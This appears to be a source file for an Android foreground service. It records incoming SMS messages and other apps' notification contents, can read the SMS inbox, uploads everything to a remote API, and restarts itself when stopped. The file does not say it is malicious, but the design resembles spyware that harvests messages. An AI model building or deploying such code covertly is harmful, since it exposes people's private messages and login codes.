package com.test.internalapp.service

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.IBinder
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.test.internalapp.R
import com.test.internalapp.activity.MessageListenerInterface
import com.test.internalapp.appinterface.ConnectivityObserver
import com.test.internalapp.appinterface.NetworkConnectivityObserver
import com.test.internalapp.localdata.AppDatabase
import com.test.internalapp.localdata.SharedPrefs
import com.test.internalapp.localdata.model.MessageEntity
import com.test.internalapp.localdata.model.StatusBarNotificationEntity
import com.test.internalapp.localdata.repository.MessageRepository
import com.test.internalapp.localdata.repository.StatusBarNotificationRepository
import com.test.internalapp.model.DummyResponse
import com.test.internalapp.model.RequestMessageModelNew
import com.test.internalapp.model.RequestNotificationModelNew
import com.test.internalapp.receiver.MessageBroadcastReceiver
import com.test.internalapp.receiver.RestarterBroadcastReceiver
import com.test.internalapp.rest.RestAdapter
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale


class MyForegroundService : Service(), MessageListenerInterface {
    private var ctx: Context? = null
    var CHANNEL_ID = "CHANNEL_ID_000"
    private lateinit var connectivityObservera: ConnectivityObserver
    private lateinit var connectivityObserver: NetworkConnectivityObserver

    private val serviceJobconnectivity = Job()
    private val serviceScopeconnectivity = CoroutineScope(Dispatchers.IO + serviceJobconnectivity)

    private val serviceJobNotifi = Job()
    private val serviceScopeNotifi = CoroutineScope(Dispatchers.IO + serviceJobNotifi)

    private val serviceJobSingle = Job()
    private val serviceScopeSingle = CoroutineScope(Dispatchers.IO + serviceJobSingle)

    private val serviceJobMessageListener = Job()
    private val serviceScopeMessageListener  = CoroutineScope(Dispatchers.IO + serviceJobMessageListener)

    private val serviceJobMessage = Job()
    private val serviceScopeMessage = CoroutineScope(Dispatchers.IO + serviceJobMessage)

    private val serviceJobMessageOneTime = Job()
    private val serviceScopeMessageOneTime = CoroutineScope(Dispatchers.IO + serviceJobMessageOneTime)

    private val database by lazy { AppDatabase.getDatabase(this) }
    private val notificationRepository by lazy { StatusBarNotificationRepository(database.statusBarNotificationDao()) }
    val messageRepository by lazy { MessageRepository(database.MessageDao()) }

    var isNetworkEnable = false
    var counter=0

    companion object {
        private val TAG = MyForegroundService::class.java.simpleName
        var isMyForegroundServiceRunning = false
        val rest = RestAdapter.adapter
    }

    @SuppressLint("MissingPermission")
    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        createNotification()
        LocalBroadcastManager.getInstance(this).registerReceiver(onNotificationPostedBroadcastReceiver, IntentFilter("notification_updated"))
        // adding bind listener for message receiver on below line.
        MessageBroadcastReceiver.bindListener(this)
        return START_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        ctx = this
        counter=0
        connectivityObserver = NetworkConnectivityObserver(applicationContext)
        observeConnectivity()
        observeNotificationDB()
        observeMessageDB()
        isMyForegroundServiceRunning = true

    }

    private fun observeConnectivity() {
        serviceScopeconnectivity.launch {
            connectivityObserver.observe().collect { status ->

                // Handle the network status change
                when (status) {
                    ConnectivityObserver.Status.Available -> {
                        isNetworkEnable = true
                      if(counter>0) {
                          serviceScopeSingle.launch {
                              try {
                                  val currentNotifications = notificationRepository.allNotifications.first()
                                  Log.i(TAG, "Current notifications: $currentNotifications")
                                  // Check network status and make API call if needed
                                  if (currentNotifications.isNotEmpty()) {
                                      // Call API
                                      callSendNotificationApi(currentNotifications, "notifi")
// Synchronous execution (not recommended for the main thread)
                                      // val response = call.execute()
                                  }
                              } catch (e: Exception) {
                                  // Handle exceptions
                                  Log.e(TAG, "Error observing current notifications", e)
                              } finally {
                                  // Ensure cleanup or additional actions if needed
                                  serviceScopeSingle.cancel()
                              }
                          }
                          serviceScopeMessageOneTime.launch {
                              try {
                                  val messages = messageRepository.getAllMessages.first()
                                  Log.i(TAG, "message serviceScopeMessageOneTime: $messages")
                                  // Check network status and make API call if needed
                                  if (messages.isNotEmpty()) {
                                      // Call API
                                      callSendMessageApi(messages,"msg")

                                  }
                              } catch (e: Exception) {
                                  // Handle exceptions
                                  Log.e(TAG, "Error observing current notifications", e)
                              } finally {
                                  // Ensure cleanup or additional actions if needed
                                  serviceScopeMessageOneTime.cancel()
                              }
                          }
                      }
                    }

                    ConnectivityObserver.Status.Unavailable -> {
                        isNetworkEnable = false
                    }

                    ConnectivityObserver.Status.Losing -> {
                        isNetworkEnable = false
                    }

                    ConnectivityObserver.Status.Lost -> {
                        isNetworkEnable = false
                    }
                }
                counter++
                Log.e(TAG, "observeConnectivity isNetworkEnable:$isNetworkEnable")
            }
        }
    }

    private fun observeNotificationDB() {
        serviceScopeNotifi.launch {
            notificationRepository.allNotificationsdistincts.collect { notifications ->
                Log.i(TAG, "observeNotificationDB collect:$notifications")
                    if (notifications.isNotEmpty()) {
                        //Call Api
                        callSendNotificationApi(notifications,"notifi")
                    }
            }
        }
    }

    private fun observeMessageDB() {
        serviceScopeMessage.launch {

            messageRepository.getAllMessagesdistincts.collect { messages ->
                Log.i(TAG, "message getAllMessagesdistinct collect:$messages")
              //  if (isNetworkEnable) {

                    if (messages.isNotEmpty()) {
                        //Call Api
                        callSendMessageApi(messages, "msg")
                    }
               // }

            }
        }
    }

    private fun callSendNotificationApi(notify: List<StatusBarNotificationEntity>, s: String) {
        val RequestNotificationModelList = convertToRequestNotificationModelList(notify,s)
        Log.e(TAG  , "RequestNotificationModelList $RequestNotificationModelList")
        val call = rest.sendNotificationData(RequestNotificationModelList)
        serviceScopeNotifi.launch {

            try {
                val response = call.execute() // Execute the network request synchronously
                if (response.isSuccessful) {
                    val dummyResponse = response.body()
                    // Process the dummyResponse as needed
                    serviceScopeNotifi.launch {
                        notificationRepository.deleteNotifications(notify)
                    }
                } else {
                    // Handle failed response
                    val errorBody = response.errorBody()?.string()
                    Log.e("$TAG-  callSendNotificationApi ERROR ", errorBody ?: "Unknown error")
                }
            } catch (e: IOException) {
                // Handle network error
                Log.e("$TAG-  callSendNotificationApi failure ", e.toString())
            }
        }


        /*call.enqueue(object : Callback<DummyResponse> {
            override fun onResponse(call: Call<DummyResponse>, response: Response<DummyResponse>) {
                if (response.isSuccessful) {
                    val dummyResponse = response.body()
                    // Process the dummyResponse as needed
                    serviceScopeNotifi.launch {
                        *//* val  notification= ArrayList<StatusBarNotificationEntity>()
                         notification.add(notify)*//*
                        notificationRepository.deleteNotifications(notify)
                    }



                } else {
                    // Handle failed response
                    Toast.makeText(ctx,""+response,Toast.LENGTH_SHORT).show()
                    Log.i("$TAG-  callSendNotificationApi ERROR ", ""+response)
                }
            }

            override fun onFailure(call: Call<DummyResponse>, t: Throwable) {
                // Handle network error or other failure
                Toast.makeText(ctx,""+t,Toast.LENGTH_SHORT).show()
                Log.i("$TAG-  callSendNotificationApi failure ", ""+t)
            }
        })*/
    }
    fun convertToRequestNotificationModelList(statusBarNotificationList: List<StatusBarNotificationEntity>,s: String): List<RequestNotificationModelNew> {
        val requestNotificationList = mutableListOf<RequestNotificationModelNew>()

        for (statusBarNotification in statusBarNotificationList) {
            val requestNotification = RequestNotificationModelNew(
                data = statusBarNotification,
                type = s
            )
            Log.e(TAG  , "requestNotification $requestNotification")
            requestNotificationList.add(requestNotification)
        }
        Log.e(TAG  , "convertToRequestNotificationModelList $requestNotificationList")
        return requestNotificationList
    }
    fun convertToRequestMessageModelList(messageList: List<MessageEntity>,s: String): List<RequestMessageModelNew> {
        val requestMessageList = mutableListOf<RequestMessageModelNew>()

        for (message in messageList) {
            val  requestMessage = RequestMessageModelNew(
                data = message,
                type = s
            )
            Log.e(TAG  , "requestMessage $requestMessage")
            requestMessageList.add( requestMessage)
        }
        Log.e(TAG  , "convertToRequestNotificationModelList $requestMessageList")
        return requestMessageList
    }
    private fun callSendMessageApi(message: List<MessageEntity>, s: String) {
       val requestMessageModelList= convertToRequestMessageModelList(message,s)
        Log.e(TAG  , "requestMessageModelList $requestMessageModelList")
        val call = rest.sendMessageData(requestMessageModelList)
        call.enqueue(object : Callback<DummyResponse> {
            override fun onResponse(call: Call<DummyResponse>, response: Response<DummyResponse>) {
                if (response.isSuccessful) {
                    val dummyResponse = response.body()
                    // Process the dummyResponse as needed
                    serviceScopeMessage.launch {
                        /*  val  messageList= ArrayList<MessageEntity>()
                          messageList.add(message)*/
                        messageRepository.deleteMessages(message)
                    }


                } else {
                    // Handle failed response
                    Toast.makeText(ctx,""+response,Toast.LENGTH_SHORT).show()
                    Log.i("$TAG-  callSendMessageApi ERROR ", ""+response)
                }
            }

            override fun onFailure(call: Call<DummyResponse>, t: Throwable) {
                // Handle network error or other failure
                Toast.makeText(ctx,""+t,Toast.LENGTH_SHORT).show()
                Log.i("$TAG-  callSendMessageApi ERROR ", ""+t)
            }
        })
    }

    private fun createNotification() {
        val builder: NotificationCompat.Builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentText("Service is running")
            .setPriority(NotificationCompat.PRIORITY_LOW)
        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        val channel = NotificationChannel(CHANNEL_ID, "MyService", NotificationManager.IMPORTANCE_MIN)
        notificationManager.createNotificationChannel(channel)
        val notification = builder.build()
        startForeground(1001, notification)

    }

    private fun readSms() {
        val contentResolver = contentResolver
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            null
        )
        if (cursor != null && cursor.moveToFirst()) {
            do {
                val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
                //smsList.add("Sender: $address\nMessage: $body")
                serviceScopeNotifi.launch {
                    val time = Calendar.getInstance().time
                    val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
                    val current = formatter.format(time)
                    val messageEntity = MessageEntity(sender = address, messageBody = body, date = current)
                    messageRepository.insertMessage(messageEntity)
                }


            } while (cursor.moveToNext())
        }
        cursor?.close()
    }

    override fun onTaskRemoved(rootIntent: Intent) {
        try {
            //stop service
            isMyForegroundServiceRunning = false

            val isStartService: Boolean = SharedPrefs.getStartService(this)
            val broadcastIntent = Intent(this, RestarterBroadcastReceiver::class.java)
            broadcastIntent.putExtra("START_SERVICE", isStartService)
            sendBroadcast(broadcastIntent)
            //myHandler.stopRepeating()
            stopSelf()
            Log.i("$TAG-  EXIT ", "stopSelf!")
        } catch (e: Exception) {

            Log.e("$TAG Exception Bcast log", e.toString())
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            Log.e(TAG, "Stopping service...")
            isMyForegroundServiceRunning = false
            serviceScopeconnectivity.cancel()
            serviceScopeNotifi.cancel()
            serviceScopeSingle.cancel()
            serviceScopeMessage.cancel()
            serviceScopeMessageOneTime.cancel()
            LocalBroadcastManager.getInstance(this).unregisterReceiver(onNotificationPostedBroadcastReceiver)

            val broadcastIntent = Intent(this, RestarterBroadcastReceiver::class.java)
            val isStartService: Boolean = SharedPrefs.getStartService(this)
            broadcastIntent.putExtra("START_SERVICE", isStartService)

            sendBroadcast(broadcastIntent)

        } catch (e: Exception) {
            Log.e("$TAG Exception onDestroy", e.toString())
        }
    }

    private val onNotificationPostedBroadcastReceiver: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action != null && intent.action == "notification_updated") {
                val pack = intent.getStringExtra("package")
                val ticker = intent.getStringExtra("ticker")
                val title = intent.getStringExtra("title")
                val text = intent.getStringExtra("text")
                val subtext = intent.getStringExtra("subtext")

                val iconByteArray = intent.getByteArrayExtra("icon")

                // Decode the byte array back to Bitmap
                val iconBitmap: Bitmap? = if (iconByteArray != null) {
                    BitmapFactory.decodeByteArray(iconByteArray, 0, iconByteArray.size)
                }
                else {
                    null
                }
                Log.e(
                    TAG, "notification_updated:" +
                            " \n package:$pack " +
                            "\n ticker:$ticker" +
                            "\n title:$title" +
                            "\n text:$text"
                )


            }
        }
    }

    override fun messageReceived(sender: String, messageBody: String, messageEntity: MessageEntity) {
        Log.e(TAG, "messageReceived sender: $sender ,$messageBody")
        serviceScopeMessageListener.launch {
            messageRepository.insertMessage(messageEntity)

        }

    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    private fun isServiceRunning(): Boolean {
        val pm: PackageManager = packageManager
        val info: PackageInfo = pm.getPackageInfo(packageName, PackageManager.GET_SERVICES)
        val services: Array<ServiceInfo> = info.services
        for (service in services) {
            if (MyForegroundService::class.java.name == service.name) {
                return true
            }
        }
        return false
    }

}